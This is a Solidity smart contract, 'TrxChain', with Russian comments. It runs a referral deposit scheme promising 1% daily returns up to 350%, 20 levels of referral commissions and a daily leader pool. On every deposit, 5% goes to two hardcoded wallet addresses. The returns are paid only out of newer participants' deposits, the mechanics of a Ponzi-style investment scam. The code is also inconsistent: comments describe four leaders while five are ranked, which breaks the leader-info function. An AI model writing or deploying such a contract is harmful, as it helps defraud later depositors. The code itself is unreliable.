pragma solidity 0.5.10;

contract TrxChain {
    struct User {
        uint256 cycle;
        address upline;
        uint256 referrals;
        uint256 payouts;
        uint256 direct_bonus;
        uint256 pool_bonus;
        uint256 match_bonus;
        uint256 deposit_amount;
        uint256 deposit_payouts;
        uint40 deposit_time;
        uint256 total_deposits;
        uint256 total_payouts;
        uint256 total_structure;
    }

    address payable public owner;
    address payable public etherchain_fund;
    address payable public admin_fee;

    mapping(address => User) public users;

    uint256[] public cycles;
    uint8[] public ref_bonuses;                     // 1 => 1%

    uint8[] public pool_bonuses;                    // 1 => 1%
    uint40 public pool_last_draw = uint40(block.timestamp);
    uint256 public pool_cycle;
    uint256 public pool_balance;
    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
    mapping(uint8 => address) public pool_top; // 5 топовых участника в день - берется с накопленого в день пула
    mapping(uint8 => address) public permanent_top; // 5 постоянных участников - награда всегда

    uint256 public total_users = 1;
    uint256 public total_deposited;
    uint256 public total_withdraw;

    event Upline(address indexed addr, address indexed upline);
    event NewDeposit(address indexed addr, uint256 amount);
    event DirectPayout(address indexed addr, address indexed from, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event PoolPayout(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event LimitReached(address indexed addr, uint256 amount);

    constructor(address payable _owner) public {
        owner = _owner;

        etherchain_fund = 0x81Cfe8eFdb6c7B7218DDd5F6bda3AA4cd1554Fd2;
        admin_fee = 0x90a056b1b27f615b08C0986910879e5b2457D68c;
        // Ежедневные комиссионные, основанные на ежедневном доходе партнеров, для каждого прямого партнера активирован 1 уровень, максимум 20 уровней, см. Ниже
        ref_bonuses.push(30);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(8);
        ref_bonuses.push(8);
        ref_bonuses.push(8);
        ref_bonuses.push(8);
        ref_bonuses.push(8);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(3);
        ref_bonuses.push(3);
        ref_bonuses.push(3);
        ref_bonuses.push(3);
        ref_bonuses.push(3); // 20

        // Ежедневный рейтинг лучших пулов 3% от ВСЕХ депозитов, отведенных в пуле, каждые 24 часа 10% пула распределяется среди 4 лучших спонсоров по объему.
        pool_bonuses.push(40);
        pool_bonuses.push(25);
        pool_bonuses.push(15);
        pool_bonuses.push(12);
        pool_bonuses.push(8);

        cycles.push(1e11);
        cycles.push(3e11);
        cycles.push(9e11);
        cycles.push(2e12);
    }

    function() payable external {
        _deposit(msg.sender, msg.value);
    }


    // изменение линий
    function _setUpline(address _addr, address _upline) private {
        if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && (users[_upline].deposit_time > 0 || _upline == owner)) {
            users[_addr].upline = _upline;
            users[_upline].referrals++;

            emit Upline(_addr, _upline);
            total_users++;

            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                if(_upline == address(0)) break;

                users[_upline].total_structure++; // увеличение структуры пригласившего

                _upline = users[_upline].upline;
            }
        }
    }


    // метод внесения депозита
    // проверяет доступный ввод исходя из возможного депозита по циклу
    // начисляет награду пригласившему - 10%
    // доабвляет гаргарду в пул лидеров
    // отправляет комиссию в фонд и админам
    //
    function _deposit(address _addr, uint256 _amount) private {
        require(users[_addr].upline != address(0) || _addr == owner, "No upline");

        if(users[_addr].deposit_time > 0) {
            users[_addr].cycle++;

            require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), "Deposit already exists");
            require(_amount >= users[_addr].deposit_amount && _amount <= cycles[users[_addr].cycle > cycles.length - 1 ? cycles.length - 1 : users[_addr].cycle], "Bad amount");
        }
        else require(_amount >= 1e8 && _amount <= cycles[0], "Bad amount");

        users[_addr].payouts = 0;
        users[_addr].deposit_amount = _amount;
        users[_addr].deposit_payouts = 0;
        users[_addr].deposit_time = uint40(block.timestamp);
        users[_addr].total_deposits += _amount;

        total_deposited += _amount;

        emit NewDeposit(_addr, _amount);

        if(users[_addr].upline != address(0)) {
            users[users[_addr].upline].direct_bonus += _amount / 10; // начисление 10% прямого бонуса вышестоящему участнику - 10% Прямая комиссия

            emit DirectPayout(users[_addr].upline, _addr, _amount / 10);
        }

        _pollDeposits(_addr, _amount); // наполнение пула

        if(pool_last_draw + 1 days < block.timestamp) {
            _drawPool();
        }

        admin_fee.transfer(_amount / 50); //  выплата комиссии 2% админу
        etherchain_fund.transfer(_amount * 3 / 100); // выплата комисси 3% в фонд

    }



    // 3% с каждого депозита отстетивагются в пул лидеров
    function _pollDeposits(address _addr, uint256 _amount) private {
        pool_balance += _amount * 3 / 100; //  Ежедневный рейтинг лучших пулов 3% от ВСЕХ депозитов, отведенных в пуле, каждые 24 часа 10% пула распределяется среди 4 лучших спонсоров по объему.⠀

        address upline = users[_addr].upline;

        if(upline == address(0)) return;

        pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == upline) break;

            if(pool_top[i] == address(0)) {
                pool_top[i] = upline;
                break;
            }

            if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {
                for(uint8 j = i + 1; j < pool_bonuses.length; j++) {
                    if(pool_top[j] == upline) {
                        for(uint8 k = j; k <= pool_bonuses.length; k++) {
                            pool_top[k] = pool_top[k + 1];
                        }
                        break;
                    }
                }

                for(uint8 j = uint8(pool_bonuses.length - 1); j > i; j--) {
                    pool_top[j] = pool_top[j - 1];
                }

                pool_top[i] = upline;

                break;
            }
        }
    }

    // начисление реферальных вознаграждений линий в структуре
    function _refPayout(address _addr, uint256 _amount) private {
        address up = users[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break; // не для админа

            if(users[up].referrals >= i + 1) {
                uint256 bonus = _amount * ref_bonuses[i] / 100; // начисление бонуса комиссионого 30-3%(20 уровней)

                users[up].match_bonus += bonus; // здесь кучастнику происхоит сумирование бонусов в соответствие с

                emit MatchPayout(up, _addr, bonus);
            }

            up = users[up].upline;
        }
    }



    // метод накапливает 4 лидерам их награды и очищает список
    function _drawPool() private {
        pool_last_draw = uint40(block.timestamp);
        pool_cycle++;

        uint256 draw_amount = pool_balance / 10; // 10%  - Ежедневный рейтинг лучших пулов 3% от ВСЕХ депозитов, отведенных в пуле, каждые 24 часа 10% пула распределяется среди 4 лучших спонсоров по объему.⠀

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            uint256 win = draw_amount * pool_bonuses[i] / 100;

            users[pool_top[i]].pool_bonus += win;
            pool_balance -= win;

            emit PoolPayout(pool_top[i], win);
        }

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            pool_top[i] = address(0);
        }
    }

    function deposit(address _upline) payable external {
        _setUpline(msg.sender, _upline);
        _deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender); // текущий депозит и макс вывод от депозита

        require(users[msg.sender].payouts < max_payout, "Full payouts"); // ывел весь депозит

        // Deposit payout
        if(to_payout > 0) {
            if(users[msg.sender].payouts + to_payout > max_payout) {
                to_payout = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].deposit_payouts += to_payout;
            users[msg.sender].payouts += to_payout;

            _refPayout(msg.sender, to_payout);
        }

        // Direct payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].direct_bonus > 0) {
            uint256 direct_bonus = users[msg.sender].direct_bonus;

            if(users[msg.sender].payouts + direct_bonus > max_payout) {
                direct_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].direct_bonus -= direct_bonus;
            users[msg.sender].payouts += direct_bonus;
            to_payout += direct_bonus;
        }

        // Pool payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].pool_bonus > 0) {
            uint256 pool_bonus = users[msg.sender].pool_bonus;

            if(users[msg.sender].payouts + pool_bonus > max_payout) {
                pool_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].pool_bonus -= pool_bonus;
            users[msg.sender].payouts += pool_bonus;
            to_payout += pool_bonus;
        }

        // Match payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].match_bonus > 0) {
            uint256 match_bonus = users[msg.sender].match_bonus;

            if(users[msg.sender].payouts + match_bonus > max_payout) {
                match_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].match_bonus -= match_bonus;
            users[msg.sender].payouts += match_bonus;
            to_payout += match_bonus;
        }

        require(to_payout > 0, "Zero payout");

        users[msg.sender].total_payouts += to_payout;
        total_withdraw += to_payout;

        msg.sender.transfer(to_payout);

        emit Withdraw(msg.sender, to_payout);

        if(users[msg.sender].payouts >= max_payout) {
            emit LimitReached(msg.sender, users[msg.sender].payouts);
        }
    }
    // максимальный доход 350 %
    function maxPayoutOf(uint256 _amount) pure external returns(uint256) {
        return _amount * 35 / 10; // 350% для изменения цикла
    }
    //возвращает текущий депозит и максимальный доход за вычетом выводов и наград для адреса
    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);

        if(users[_addr].deposit_payouts < max_payout) {
            payout = (users[_addr].deposit_amount * ((block.timestamp - users[_addr].deposit_time) / 1 days) / 100) - users[_addr].deposit_payouts;  // 1% пассив каждый день

            if(users[_addr].deposit_payouts + payout > max_payout) {
                payout = max_payout - users[_addr].deposit_payouts;
            }
        }
    }

    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus, uint256 pool_bonus, uint256 match_bonus) {
        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].pool_bonus, users[_addr].match_bonus);
    }

    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure) {
        return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure);
    }

    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw, uint40 _pool_last_draw, uint256 _pool_balance, uint256 _pool_lider) {
        return (total_users, total_deposited, total_withdraw, pool_last_draw, pool_balance, pool_users_refs_deposits_sum[pool_cycle][pool_top[0]]);
    }

    // озвращает инфо о 4 адресах оидерах и их балансах
    function poolTopInfo() view external returns(address[4] memory addrs, uint256[4] memory deps) {
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            addrs[i] = pool_top[i];
            deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];
        }
    }
}